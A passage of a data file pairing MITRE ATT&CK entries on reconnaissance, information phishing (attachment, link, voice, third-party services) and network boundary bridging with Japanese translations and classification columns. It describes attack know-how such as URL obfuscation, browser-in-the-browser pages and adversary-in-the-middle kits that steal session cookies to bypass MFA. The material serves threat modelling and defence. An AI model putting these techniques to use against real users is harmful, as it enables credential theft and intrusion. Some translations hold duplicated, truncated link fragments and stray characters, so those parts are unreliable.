これらの情報源から得られる情報は、他の偵察手法（例：[情報フィッシング](https://attack.mitre.org/techniques/T1598) や [公開ウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593)）の機会を明らかにし、作戦リソースの確立につながる可能性がある。 （例：[能力開発](https://attack.mitre.org/techniques/T1587) または [能力取得](https://attack.mitre.org/techniques/T1588)）、および／または初期アクセス （例：[外部リモートサービス](https://attack.mitre.org/techniques/T1133) または [有効なアカウント](https://attack.mitre.org/techniques/T1078)）。,reconnaissance,PRE,remote_service_abuse,unknown,user_interaction;endpoint_execution;network_connectivity;database_access,specified,Unknown,has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--a51eb150-93b1-484b-a503-e51453b127a4,2020-10-02T17:01:42.558Z,2025-04-15T23:03:31.068Z,,,,
T1597.001,T1597,Threat Intel Vendors,脅威インテリジェンスベンダー,"Adversaries may search private data from threat intelligence vendors for information that can be used during targeting. Threat intelligence vendors may offer paid feeds or portals that offer more data than what is publicly reported. Although sensitive details (such as customer names and other identifiers) may be redacted, this information may contain trends regarding breaches such as target industries, attribution claims, and successful TTPs/countermeasures.(Citation: D3Secutrity CTI Feeds) Adversaries may search in private threat intelligence vendor data to gather actionable information. Threat actors may seek information/indicators gathered about their own campaigns, as well as those conducted by other adversaries that may align with their target industries, capabilities/objectives, or other operational concerns. Information reported by vendors may also reveal opportunities other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).",敵対者は、標的選定時に利用可能な情報を得るため、脅威インテリジェンスベンダーの非公開データを検索する可能性がある。脅威インテリジェンスベンダーは、公開報告内容以上のデータを提供する有料フィードやポータルを提供している場合がある。機密情報（顧客名やその他の識別子など）は削除されている可能性があるが、この情報には標的業界、帰属主張、成功したTTP/対策など、侵害に関する傾向が含まれている可能性がある。(引用元: D3Secutrity CTI Feeds)敵対者は、実行可能な情報を収集するために、非公開の脅威インテリジェンスベンダーデータを検索する可能性がある。脅威アクターは、自らが実施したキャンペーンに関する情報や指標だけでなく、自らが標的とする業界、能力/目的、その他の作戦上の関心事項と一致する可能性のある他の敵対者が実施したキャンペーンに関する情報や指標も求める可能性がある。 ベンダーが報告する情報は、他の偵察手法（例：[公開ウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593)）や作戦リソースの確立（例：[能力開発](https://attack.mitre.org/techniques/T1587) または [能力取得](https://attack.mitre.org/techniques/T1588)）、初期アクセス手段（例：[公開アプリケーションの悪用](https://attack.mitre.org/techniques/T)）の機会を示す場合もある。(https://attack.mitre.org/techniques/T1588))、および／または初期アクセス（例：[公開アプリケーションの悪用](https://attack.mitre.org/techniques/T1190) または [外部リモートサービス](https://attack.mitre.org/techniques/T1133)）の可能性を示す場合があります。,reconnaissance,PRE,remote_service_abuse,unknown,network_connectivity,specified,Unknown,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--51e54974-a541-4fb6-a61b-0518e4c6de41,2020-10-02T17:03:45.918Z,2025-04-15T23:16:02.261Z,,,,
T1597.002,T1597,Purchase Technical Data,技術データの購入,"Adversaries may purchase technical information about victims that can be used during targeting. Information about victims may be available for purchase within reputable private sources and databases, such as paid subscriptions to feeds of scan databases or other data aggregation services. Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets. Adversaries may purchase information about their already identified targets, or use purchased data to discover opportunities for successful breaches. Threat actors may gather various technical details from purchased data, including but not limited to employee contact information, credentials, or specifics regarding a victim’s infrastructure.(Citation: ZDNET Selling Data) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).",攻撃者は標的選定時に利用可能な被害者に関する技術情報を購入する可能性がある。被害者情報は、スキャンデータベースのフィードやその他のデータ集約サービスへの有料サブスクリプションなど、信頼できる民間ソースやデータベース内で購入可能である。攻撃者はダークウェブやサイバー犯罪闇市場など信頼性の低いソースからも情報を購入する可能性がある。 攻撃者は、既に特定した標的に関する情報を購入したり、購入したデータを利用して侵入成功の機会を発見したりする可能性がある。脅威アクターは、購入したデータから従業員の連絡先情報、認証情報、被害者のインフラに関する詳細など、様々な技術的詳細を収集する可能性がある。(引用元: ZDNET Selling Data) こうした情報源から得られるデータは、他の偵察手法（例: [情報フィッシング](https://attack.mitre.org/techniques/T1598) や [公開ウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593)）の機会を明らかにし、運用リソースの確立につながる可能性があります （例：[能力開発](https://attack.mitre.org/techniques/T1587) または [能力取得](https://attack.mitre.org/techniques/T1588)）、および／または初期アクセス （例：[外部リモートサービス](https://attack.mitre.org/techniques/T1133) または [有効なアカウント](https://attack.mitre.org/techniques/T1078)）。,reconnaissance,PRE,credential_abuse,unknown,authentication_system;user_interaction;endpoint_execution;network_connectivity;database_access,specified,Unknown,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--0a241b6c-7bb2-48f9-98f7-128145b4d27f,2020-10-02T17:05:43.562Z,2025-04-15T22:58:36.430Z,,,,
T1598,,Phishing for Information,情報フィッシング,"Adversaries may send phishing messages to elicit sensitive information that can be used during targeting. Phishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Phishing for information is different from [Phishing](https://attack.mitre.org/techniques/T1566) in that the objective is gathering data from the victim rather than executing malicious code. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass credential harvesting campaigns. Adversaries may also try to obtain information directly through the exchange of emails, instant messages, or other electronic conversation means.(Citation: ThreatPost Social Media Phishing)(Citation: TrendMictro Phishing)(Citation: PCMag FakeLogin)(Citation: Sophos Attachment)(Citation: GitHub Phishery) Victims may also receive phishing messages that direct them to call a phone number where the adversary attempts to collect confidential information.(Citation: Avertium callback phishing) Phishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages. Another way to accomplish this is by [Email Spoofing](https://attack.mitre.org/techniques/T1672)(Citation: Proofpoint-spoof) the identity of the sender, which can be used to fool both the human recipient as well as automated security tools.(Citation: cyberproof-double-bounce) Phishing for information may also involve evasive techniques, such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., [Email Hiding Rules](https://attack.mitre.org/techniques/T1564/008)).(Citation: Microsoft OAuth Spam 2022)(Citation: Palo Alto Unit 42 VBA Infostealer 2014)",攻撃者は標的化に利用可能な機密情報を引き出すため、フィッシングメッセージを送信することがあります。情報フィッシングとは、標的に情報を開示させる（多くの場合認証情報やその他の実用的な情報）ための欺瞞的試みです。情報フィッシングは、悪意のあるコードの実行ではなく被害者からのデータ収集を目的とする点で、[フィッシング](https://attack.mitre.org/techniques/T1566)とは異なります。 あらゆる形態のフィッシングは電子的に配信されるソーシャルエンジニアリングである。フィッシングは標的型（スピアフィッシング）となる場合がある。スピアフィッシングでは、特定の個人、企業、業界が攻撃対象となる。より一般的には、攻撃者は大量認証情報収集キャンペーンなど、非標的型フィッシングを実施する。攻撃者は電子メール、インスタントメッセージ、その他の電子的会話手段を通じた直接的な情報取得を試みる場合もある。(出典: ThreatPost Social Media Phishing)(出典: TrendMictro Phishing)(出典: PCMag FakeLogin)(出典: Sophos Attachment)(出典: GitHub Phishery) 被害者は、攻撃者が機密情報を収集しようとする電話番号への通話指示を含むフィッシングメッセージを受け取る場合もある。(出典: Avertium callback phishing) 情報フィッシングでは、情報を収集する正当な理由を持つ情報源を装う（例：[アカウントの開設](https://attack.mitre.org/techniques/T1585) や [アカウントの侵害](https://attack.mitre.org/techniques/T1586)）といったソーシャルエンジニアリング手法や、一見緊急性のあるメッセージを複数回送信する手法が頻繁に用いられます。 別の手法として、送信者IDを偽装する[メールスプーフィング](https://attack.mitre.org/techniques/T1672)(引用元: Proofpoint-spoof)があり、これにより人間の受信者と自動セキュリティツールの両方を欺くことが可能となる。(引用元: cyberproof-double-bounce) 情報フィッシングでは、悪用されている侵害アカウントから送信されるメールやメタデータ/ヘッダーを削除・改ざんする回避技術も用いられる（例: [Email Hiding Rules](https://attack.mitre.org/techniques/T1564/008)）。(引用: Microsoft OAuth Spam 2022)(引用: Palo Alto Unit 42 VBA Infostealer 2014),reconnaissance,PRE,credential_abuse,unknown,authentication_system;identity_federation;user_interaction;email_infrastructure;logging_monitoring,specified,Log / Monitoring Server;Mail / Collaboration,has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--cca0ccb6-a068-4574-a722-b1556f86833a,2020-10-02T17:07:01.502Z,2025-04-15T19:59:08.689Z,,,,
T1598.001,T1598,Spearphishing Service,スピアフィッシングサービス,"Adversaries may send spearphishing messages via third-party services to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services.(Citation: ThreatPost Social Media Phishing) These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries may create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and information about their environment. Adversaries may also use information from previous reconnaissance efforts (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.",攻撃者は、標的化時に使用可能な機密情報を引き出すため、サードパーティサービス経由でスピアフィッシングメッセージを送信することがあります。情報取得目的のスピアフィッシングは、標的に情報を開示させる（多くの場合、認証情報やその他の実用的な情報）ための欺瞞的試みです。 情報収集を目的としたスピアフィッシングでは、情報を収集する正当な理由を持つ情報源を装う（例：[アカウントの開設](https://attack.mitre.org/techniques/T1585) や [アカウントの侵害](https://attack.mitre.org/techniques/T1586)）といったソーシャルエンジニアリング手法や、一見緊急性のあるメッセージを複数回送信する手法が頻繁に用いられる。 あらゆる形態のスピアフィッシングは、特定の個人・企業・業界を標的とした電子的なソーシャルエンジニアリング攻撃である。このシナリオでは、攻撃者は各種ソーシャルメディアサービス、個人用ウェブメール、その他企業管理外のサービスを通じてメッセージを送信する（出典：ThreatPost Social Media Phishing）。これらのサービスは企業よりもセキュリティポリシーが緩い傾向にある。 大半のスピアフィッシングと同様、目的は標的との信頼関係を構築するか、何らかの形で標的の関心を引くことです。攻撃者は偽のソーシャルメディアアカウントを作成し、従業員に潜在的な就職機会についてメッセージを送ることがあります。これにより、自社の環境に関するサービス、ポリシー、情報を尋ねるための妥当な理由が生まれます。 攻撃者はまた、過去の偵察活動（例：[ソーシャルメディア](https://attack.mitre.org/techniques/T1593/001) や [被害者所有ウェブサイトの検索](https://attack.mitre.org/techniques/T1594)）から得た情報を活用し、説得力のある信憑性の高い餌を仕掛ける。,reconnaissance,PRE,credential_abuse,unknown,authentication_system;user_interaction;cloud_control_plane,specified,Unknown,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--f870408c-b1cd-49c7-a5c7-0ef0fc496cc6,2020-10-02T17:08:07.742Z,2025-04-15T23:11:18.959Z,,,,
T1598.002,T1598,Spearphishing Attachment,スピアフィッシング添付ファイル,"Adversaries may send spearphishing messages with a malicious attachment to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email. In some cases, they may rely upon the recipient populating information, then returning the file.(Citation: Sophos Attachment)(Citation: GitHub Phishery) The text of the spearphishing email usually tries to give a plausible reason why the file should be filled-in, such as a request for information from a business associate. In other cases, adversaries may leverage techniques such as [HTML Smuggling](https://attack.mitre.org/techniques/T1027/006) to harvest user credentials via fake login portals.(Citation: Huntress HTML Smuggling 2024) Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.",攻撃者は標的化に利用可能な機密情報を引き出すため、悪意のある添付ファイル付きのスピアフィッシングメッセージを送信することがあります。情報取得を目的としたスピアフィッシングは、標的に情報を漏洩させる（特に認証情報やその他の実用的な情報）ための欺瞞的試みです。 情報収集を目的としたスピアフィッシングでは、情報を収集する正当な理由を持つ情報源を装う（例：[アカウントの開設](https://attack.mitre.org/techniques/T1585) や [アカウントの侵害](https://attack.mitre.org/techniques/T1586)）といったソーシャルエンジニアリング手法や、一見緊急性のあるメッセージを複数回送信する手法が頻繁に用いられます。 あらゆる形態のスピアフィッシングは、特定の個人、企業、業界を標的とした電子的なソーシャルエンジニアリングです。このシナリオでは、攻撃者はスピアフィッシングメールにファイルを添付します。 場合によっては、受信者が情報を入力してファイルを返送することを期待することもあります（引用元：Sophos Attachment）（引用元：GitHub Phishery）。標的型フィッシングメールの本文は、通常、ビジネスパートナーからの情報要求など、ファイルに入力すべき妥当な理由を提示しようとします。 また、[HTMLスモグリング](https://attack.mitre.org/techniques/T1027/006)などの手法を用いて偽のログインポータル経由でユーザー認証情報を収集する場合もある（出典：Huntress HTML Smuggling 2024）。 攻撃者は、過去の偵察活動（例：[公開ウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593) や [被害者所有ウェブサイトの検索](https://attack.mitre.org/techniques/T1594)）で得た情報を活用し、説得力のある信憑性の高い餌を作成することもある。,reconnaissance,PRE,credential_abuse,unknown,authentication_system;user_interaction;email_infrastructure;file_storage_access;logging_monitoring,specified,Log / Monitoring Server;Mail / Collaboration,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--8982a661-d84c-48c0-b4ec-1db29c6cf3bc,2020-10-02T17:08:57.386Z,2025-04-15T19:58:49.390Z,,,,
T1598.003,T1598,Spearphishing Link,スピアフィッシングリンク,"Adversaries may send spearphishing messages with a malicious link to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, the malicious emails contain links generally accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser.(Citation: TrendMictro Phishing)(Citation: PCMag FakeLogin) The given website may be a clone of a legitimate site (such as an online or corporate login portal) or may closely resemble a legitimate site in appearance and have a URL containing elements from the real site. URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an “@ Esymbol: for example, `hxxp://google.com@1157586937`.(Citation: Mandiant URL Obfuscation 2023) Adversaries may also embed “tracking pixels E ""web bugs"", or ""web beacons"" within phishing messages to verify the receipt of an email, while also potentially profiling and tracking victim information such as IP address.(Citation: NIST Web Bug) (Citation: Ryte Wiki) These mechanisms often appear as small images (typically one pixel in size) or otherwise obfuscated objects and are typically delivered as HTML code containing a link to a remote server. (Citation: Ryte Wiki)(Citation: IAPP) Adversaries may also be able to spoof a complete website using what is known as a ""browser-in-the-browser"" (BitB) attack. By generating a fake browser popup window with an HTML-based address bar that appears to contain a legitimate URL (such as an authentication portal), they may be able to prompt users to enter their credentials while bypassing typical URL verification methods.(Citation: ZScaler BitB 2020)(Citation: Mr. D0x BitB 2022) Adversaries can use phishing kits such as `EvilProxy` and `Evilginx2` to perform adversary-in-the-middle phishing by proxying the connection between the victim and the legitimate website. On a successful login, the victim is redirected to the legitimate website, while the adversary captures their session cookie (i.e., [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)) in addition to their username and password. This may enable the adversary to then bypass MFA via [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004).(Citation: Proofpoint Human Factor) Adversaries may also send a malicious link in the form of Quick Response (QR) Codes (also known as “quishing E. These links may direct a victim to a credential phishing page.(Citation: QR-campaign-energy-firm) By using a QR code, the URL may not be exposed in the email and may thus go undetected by most automated email security scans.(Citation: qr-phish-agriculture) These QR codes may be scanned by or delivered directly to a user’s mobile device (i.e., [Phishing](https://attack.mitre.org/techniques/T1660)), which may be less secure in several relevant ways.(Citation: qr-phish-agriculture) For example, mobile users may not be able to notice minor differences between genuine and credential harvesting websites due to mobile’s smaller form factor. From the fake website, information is gathered in web forms and sent to the adversary. Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.",攻撃者は標的を特定する際に利用可能な機密情報を引き出すため、悪意のあるリンクを含むスピアフィッシングメッセージを送信することがあります。情報取得を目的としたスピアフィッシングは、標的に情報を漏洩させるよう騙す試みであり、認証情報やその他の実用的な情報が頻繁に狙われます。 情報収集を目的としたスピアフィッシングでは、情報収集の正当性を装う（例：[アカウント開設](https://attack.mitre.org/techniques/T1585) や [アカウント侵害](https://attack.mitre.org/techniques/T1586) など）といったソーシャルエンジニアリング手法や、複数の緊急性を装ったメッセージ送信が頻繁に用いられます。 あらゆる形態のスピアフィッシングは、特定の個人、企業、業界を標的とした電子的に配信されるソーシャルエンジニアリングです。 このシナリオでは、悪意のあるメールには通常、ソーシャルエンジニアリングのテキストが添えられたリンクが含まれており、ユーザーに積極的にクリックしたり、URLをコピーしてブラウザに貼り付けたりするよう誘導します。（引用元：TrendMictro Phishing）（引用元：PCMag FakeLogin）指定されたウェブサイトは、正規サイト（オンラインや企業のログインポータルなど）のクローンである場合や、正規サイトと外観が非常に似ており、URLに実際のサイトからの要素が含まれている場合があります。 URLは、URLスキーマの特性を悪用して難読化される場合もあります。例えば、整数または16進数ベースのホスト名形式の受け入れや、「@」記号前のテキストの自動削除などです。例：`hxxp://google.com@1157586937`。(出典: Mandiant URL Obfuscation 2023) 攻撃者はまた、フィッシングメッセージ内に「トラッキングピクセル」E 「ウェブバグ」または「ウェブビーコン」を埋め込み、メール受信を確認すると同時に、IPアドレスなどの被害者情報をプロファイリング・追跡する可能性があります。(出典: NIST Web Bug) (出典: Ryte Wiki) これらのメカニズムは、小さな画像（通常は1ピクセルサイズ）やその他の難読化されたオブジェクトとして現れ、通常はリモートサーバーへのリンクを含むHTMLコードとして配信されます。（引用元：Ryte Wiki）（引用元：IAPP）攻撃者は「ブラウザ内ブラウザ」（BitB）攻撃と呼ばれる手法を用いて、ウェブサイト全体を偽装することも可能です。 HTMLベースのアドレスバーを備えた偽のブラウザポップアップウィンドウを生成し、正当なURL（認証ポータルなど）を含むように見せかけることで、ユーザーに認証情報を入力させ、通常のURL検証方法を回避することが可能となる。(引用: ZScaler BitB 2020)(引用: Mr. D0x BitB 2022) 攻撃者は、`EvilProxy` や `Evilginx2` などのフィッシングキットを使用して、被害者と正規のウェブサイト間の接続をプロキシすることで、中間者型フィッシングを実行することができます。 ログインが成功すると、被害者は正規のウェブサイトにリダイレクトされる一方、攻撃者はユーザー名とパスワードに加えてセッションクッキー（すなわち[Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)）をキャプチャします。 これにより、攻撃者は[Web Session Cookie](https://attack.mitre.org/techniques/T1550/004)を介してMFAをバイパスできる可能性があります。（引用元：Proofpoint Human Factor）攻撃者は、QRコード（「クイッシング」とも呼ばれる）の形で悪意のあるリンクを送信することもあります。これらのリンクは、被害者を認証情報フィッシングページに誘導する可能性があります（引用元：QR-campaign-energy-firm）。QRコードを使用することで、URLがメールに表示されないため、ほとんどの自動メールセキュリティスキャンでは検出されません。(引用元: qr-phish-agriculture) これらのQRコードは、ユーザーのモバイル端末でスキャンされるか、直接端末に配信される可能性があります（例: [フィッシング](https://attack.mitre.org/techniques/T1660)）。モバイル端末は、いくつかの点でセキュリティが脆弱である可能性があります。(引用元: qr-phish-agriculture) 例えば、モバイル端末の画面サイズが小さいため、ユーザーは正規サイトと認証情報収集サイトの微妙な差異に気づきにくい。偽サイトでは、ウェブフォームから情報が収集され攻撃者に送信される。 攻撃者は、以前の偵察活動（例：[公開ウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593) や [被害者所有ウェブサイトの検索](https://attack.mitre.org/techniques/T1594)）で得た情報を活用し、説得力のある信憑性の高い餌を仕掛ける可能性もある。,reconnaissance,PRE,credential_abuse,unknown,authentication_system;mfa_in_use;user_interaction;network_connectivity;email_infrastructure;logging_monitoring,specified,Log / Monitoring Server;Mail / Collaboration;Proxy / Gateway,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--2d3f5b3c-54ca-4f4d-bb1f-849346d31230,2020-10-02T17:09:50.723Z,2025-04-15T23:10:59.931Z,,,,
T1598.004,T1598,Spearphishing Voice,スピアフィッシング音声,"Adversaries may use voice communications to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Impersonation](https://attack.mitre.org/techniques/T1656)) and/or creating a sense of urgency or alarm for the recipient. All forms of phishing are electronically delivered social engineering. In this scenario, adversaries use phone calls to elicit sensitive information from victims. Known as voice phishing (or ""vishing""), these communications can be manually executed by adversaries, hired call centers, or even automated via robocalls. Voice phishers may spoof their phone number while also posing as a trusted entity, such as a business partner or technical support staff.(Citation: BOA Telephone Scams) Victims may also receive phishing messages that direct them to call a phone number (""callback phishing"") where the adversary attempts to collect confidential information.(Citation: Avertium callback phishing) Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to tailor pretexts to be even more persuasive and believable for the victim.",敵対者は、標的設定時に使用できる機密情報を引き出すために音声通信を利用する場合があります。 情報収集を目的としたスピアフィッシングは、標的に情報を漏洩させるよう騙す試みであり、認証情報やその他の実用的な情報が頻繁に狙われます。情報収集型スピアフィッシングでは、情報を収集する正当な理由を持つ情報源を装う（例：[なりすまし](https://attack.mitre.org/techniques/T1656)）や、受信者に緊急性や警戒心を抱かせるといったソーシャルエンジニアリング手法が頻繁に用いられます。 あらゆる形態のフィッシングは電子的に行われるソーシャルエンジニアリングである。このシナリオでは、攻撃者は電話を利用して被害者から機密情報を引き出す。ボイスフィッシング（または「ヴィッシング」）として知られるこれらの通信は、攻撃者自身による手動実行、委託コールセンター、さらには自動音声通話による自動化で行われる可能性がある。 音声フィッシングの犯人は、電話番号を偽装すると同時に、ビジネスパートナーや技術サポートスタッフなどの信頼できる組織を装う場合があります。（引用元: BOA Telephone Scams）被害者は、特定の電話番号への通話（「コールバックフィッシング」）を指示するフィッシングメッセージを受け取ることもあり、そこで攻撃者は機密情報の収集を試みます。（引用元: Avertium callback phishing） 攻撃者は、過去の偵察活動（例：[公開ウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593) や [被害者所有ウェブサイトの検索](https://attack.mitre.org/techniques/T1594)）で得た情報を活用し、被害者にとってより説得力があり信憑性の高い口実を構築することもある。,reconnaissance,PRE,credential_abuse,unknown,authentication_system;user_interaction;endpoint_execution,specified,Unknown,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--6a5d222a-a7e0-4656-b110-782c33098289,2023-09-07T21:48:39.516Z,2025-04-15T23:11:31.420Z,,,,
T1599,,Network Boundary Bridging,ネットワーク境界のブリッジング,"Adversaries may bridge network boundaries by compromising perimeter network devices or internal devices responsible for network segmentation. Breaching these devices may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks. Devices such as routers and firewalls can be used to create boundaries between trusted and untrusted networks. They achieve this by restricting traffic types to enforce organizational policy in an attempt to reduce the risk inherent in such connections. Restriction of traffic can be achieved by prohibiting IP addresses, layer 4 protocol ports, or through deep packet inspection to identify applications. To participate with the rest of the network, these devices can be directly addressable or transparent, but their mode of operation has no bearing on how the adversary can bypass them when compromised. When an adversary takes control of such a boundary device, they can bypass its policy enforcement to pass normally prohibited traffic across the trust boundary between the two separated networks without hinderance. By achieving sufficient rights on the device, an adversary can reconfigure the device to allow the traffic they want, allowing them to then further achieve goals such as command and control via [Multi-hop Proxy](https://attack.mitre.org/techniques/T1090/003) or exfiltration of data via [Traffic Duplication](https://attack.mitre.org/techniques/T1020/001). Adversaries may also target internal devices responsible for network segmentation and abuse these in conjunction with [Internal Proxy](https://attack.mitre.org/techniques/T1090/001) to achieve the same goals.(Citation: Kaspersky ThreatNeedle Feb 2021) In the cases where a border device separates two separate organizations, the adversary can also facilitate lateral movement into new victim environments.",攻撃者は、境界ネットワークデバイスやネットワークセグメンテーションを担当する内部デバイスを侵害することで、ネットワーク境界をブリッジする可能性があります。これらのデバイスを侵害することで、信頼できるネットワークと信頼できないネットワークを分離するトラフィックルーティングの制限を迂回できるようになります。ルーターやファイアウォールなどのデバイスは、信頼できるネットワークと信頼できないネットワークの境界を作成するために使用されます。これらは、組織のポリシーを適用するためにトラフィックの種類を制限することで、このような接続に内在するリスクを低減しようとします。 トラフィック制限は、IPアドレスやレイヤ4プロトコルポートの禁止、あるいはアプリケーションを識別するディープパケットインスペクションによって実現される。ネットワークの他の部分と連携するため、これらのデバイスは直接アドレス指定可能または透過的である場合があるが、その動作モードは侵害された際に敵対者がそれらを迂回する方法には影響しない。 攻撃者が境界デバイスを制御下に置くと、ポリシー適用を迂回して通常禁止されるトラフィックを、分離された2つのネットワーク間の信頼境界を妨げられずに通過させることが可能となる。デバイス上で十分な権限を獲得すれば、攻撃者はデバイスを再構成して任意のトラフィックを許可し、[マルチホッププロキシ](https://attack.mitre.org/techniques/T1090/003) によるコマンド＆コントロールや、[トラフィック複製](https://attack.mitre.org/techniques/T1020/001) によるデータ流出といった目的を達成できる。 また、ネットワークセグメンテーションを担当する内部デバイスを標的にし、[内部プロキシ](https://attack.mitre.org/techniques/T1090/001) と組み合わせて悪用し、同様の目的を達成する場合もある。(引用元: Kaspersky ThreatNeedle 2021年2月) 境界デバイスが 2 つの別々の組織を分離している場合、攻撃者は新しい被害者環境への横方向の移動も容易に行うことができる。,defense-evasion,Network Devices,script_command_execution,stealth,endpoint_execution;network_connectivity;cloud_control_plane,specified,Network Device (FW/Proxy/AP);Proxy / Gateway,has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--b8017880-4b1e-42de-ad10-ae7ac6705166,2020-10-19T16:08:29.817Z,2025-04-16T20:37:19.349Z,,,,
T1599.001,T1599,Network Address Translation Traversal,ネットワークアドレス変換（NAT）越境,"Adversaries may bridge network boundaries by modifying a network device’s Network Address Translation (NAT) configuration. Malicious modifications to NAT may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks. Network devices such as routers and firewalls that connect multiple networks together may implement NAT during the process of passing packets between networks. When performing NAT, the network device will rewrite the source and/or destination addresses of the IP address header. Some network designs require NAT for the packets to cross the border device. A typical example of this is environments where internal networks make use of non-Internet routable addresses.(Citation: RFC1918) When an adversary gains control of a network boundary device, they can either leverage existing NAT configurations to send traffic between two separated networks, or they can implement NAT configurations of their own design. In the case of network designs that require NAT to function, this enables the adversary to overcome inherent routing limitations that would normally prevent them from accessing protected systems behind the border device. In the case of network designs that do not require NAT, address translation can be used by adversaries to obscure their activities, as changing the addresses of packets that traverse a network boundary device can make monitoring data transmissions more challenging for defenders. Adversaries may use [Patch System Image](https://attack.mitre.org/techniques/T1601/001) to change the operating system of a network device, implementing their own custom NAT mechanisms to further obscure their activities",攻撃者はネットワークデバイスのネットワークアドレス変換（NAT）設定を改変することで境界を越える。NATへの悪意ある改変により、信頼済み/非信頼済みネットワークを分離するトラフィックルーティング制限を迂回可能となる。複数ネットワークを接続するルーターやファイアウォール等のデバイスは、ネットワーク間パケット転送時にNATを実装する。NAT処理ではIPヘッダーの送信元/宛先アドレスが書き換えられる。 一部のネットワーク設計では、パケットが境界デバイスを通過するためにNATが必要となる。典型的な例は、内部ネットワークがインターネット非ルーティング可能アドレスを利用する環境である（引用: 